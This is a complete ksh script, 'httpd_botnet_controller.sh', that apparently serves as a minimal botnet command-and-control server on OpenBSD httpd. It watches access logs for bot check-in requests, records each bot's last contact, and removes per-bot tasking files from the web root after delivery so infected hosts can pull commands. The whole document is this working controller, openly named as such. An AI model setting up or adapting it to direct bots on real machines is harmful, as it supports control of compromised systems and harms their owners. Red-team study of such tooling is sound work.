#!/bin/ksh
#
# httpd_botnet_controller.sh
# Cheesy botnet controller using OpenBSD's httpd(8)
# By J. Stuart McMurray
# Created 20241027
# Last Modified 20241027

set -e

: ${CHECKIN_PATH:=httpd_botnet_controller}
: ${TASKING_DIR:=/var/www/htdocs/$CHECKIN_PATH}
: ${HTTPDLOGFILE:=/var/www/logs/access.log}
: ${LAST_DIR:=$HOME/bots}
: ${TAILFLAGS:=-f -n -0} # Unsettable for testing

# Make sure our directories exist and are usable and so on.
mkdir -p "$LAST_DIR"
touch "$TASKING_DIR/_test" && rm "$TASKING_DIR/_test"
touch "$LAST_DIR/_test" && rm "$LAST_DIR/_test"

# Note we're starting
echo "$(date) - Watching for check-ins..."

tail ${TAILFLAGS} "$HTTPDLOGFILE"           | # Watch httpd(8)'s logs.
egrep -o --line-buffered                    \
        "GET /$CHECKIN_PATH/[a-zA-Z0-9.-]+" | # Only want check-ins.
while read; do                                # Handle each check-in.
        # Extract the bot's ID
        ID=${REPLY##*/}
        # Skip ID-less check-ins
        if [[ -z "$ID" ]]; then
                continue
        fi
        # Note this bot checked in.
        touch "$LAST_DIR/$ID"
        # Remove any tasking for the bot.
        if [ -f "$TASKING_DIR/$ID" ]; then
                echo "$(date) - $ID - Sent $(rm -v $TASKING_DIR/$ID)"
        else
                echo "$(date) - $ID - Check-in"
        fi
done
